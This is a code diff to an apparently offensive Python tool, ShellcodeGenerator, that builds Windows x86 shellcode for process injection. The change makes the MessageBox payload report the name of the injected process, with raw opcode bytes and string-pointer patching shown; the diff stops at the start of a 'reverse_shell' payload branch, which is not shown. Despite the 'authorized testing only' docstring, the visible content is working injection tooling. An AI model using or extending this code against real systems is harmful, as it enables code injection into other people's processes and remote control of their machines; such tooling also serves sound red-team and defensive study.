@@ -116,8 +116,10 @@ class ShellcodeGenerator:
         
         return shellcode
 
-    def create_real_shellcode_payload(self, payload_type="message_box"):
-        """Generate actual functional shellcode for Windows (for authorized testing only)"""
+    def create_real_shellcode_payload(self, payload_type="message_box", target_process="Unknown"):
+        """Generate actual functional shellcode for Windows (for authorized testing only). 
+        For 'message_box' payload, dynamically embeds target process name in the displayed message.
+        """
         
         if payload_type == "message_box":
             # Real MessageBox shellcode for Windows x86
@@ -209,25 +211,22 @@ class ShellcodeGenerator:
                 0xE9, 0x8B, 0xFF, 0xFF, 0xFF,             # JMP -117
             ])
             
-            # Add real string data
-            title = b"Security Demo\x00"
-            message = b"COFF Injection Successful!\x00"
-            
-            # Patch string pointers into shellcode
+            # --- Add custom strings dynamically ---
+            title = f"Injected into {target_process}".encode('ascii') + b"\x00"
+            message = b"I was able to inject successfully!\x00"
+
+            # --- Patch offsets dynamically ---
             title_offset = len(shellcode)
             message_offset = title_offset + len(title)
-            
-            # Convert to bytearray for patching
+
             shellcode = bytearray(shellcode)
-            
-            # Patch string pointers
-            shellcode[16:20] = struct.pack('<I', title_offset)    # Title pointer
-            shellcode[20:24] = struct.pack('<I', message_offset)   # Message pointer
-            
-            # Add strings to shellcode
+            shellcode[16:20] = struct.pack('<I', title_offset)   # Title pointer
+            shellcode[20:24] = struct.pack('<I', message_offset) # Message pointer
+
+            # --- Append the actual string data ---
             shellcode.extend(title)
             shellcode.extend(message)
-            
+
             return bytes(shellcode)
         
         elif payload_type == "reverse_shell":
